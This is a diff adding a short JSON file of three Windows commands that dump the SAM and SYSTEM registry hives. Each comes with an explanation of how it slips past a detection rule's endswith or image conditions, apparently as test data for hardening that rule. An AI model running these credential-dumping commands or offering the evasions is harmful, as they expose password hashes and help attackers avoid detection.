@@ -1,0 +1,14 @@
+[
+  {
+    "output": "regedit.exe /E C:\\temp\\sam.reg \"HKLM\\SAM\"",
+    "explanation": "By enclosing the registry key path in double quotes, the command line no longer strictly ends with '\\sam', bypassing the 'selection_cli_3' endswith condition."
+  },
+  {
+    "output": "regedit.exe /E C:\\temp\\system.reg HKLM\\SYSTEM ",
+    "explanation": "Adding a trailing space to the end of the command line causes the 'endswith' condition in 'selection_cli_3' to fail, effectively bypassing the detection."
+  },
+  {
+    "output": "reg.exe save HKLM\\SAM C:\\temp\\sam.save",
+    "explanation": "This bypasses the rule entirely by using the built-in 'reg.exe' utility rather than 'regedit.exe', completely evading the 'selection_img' condition."
+  }
+]
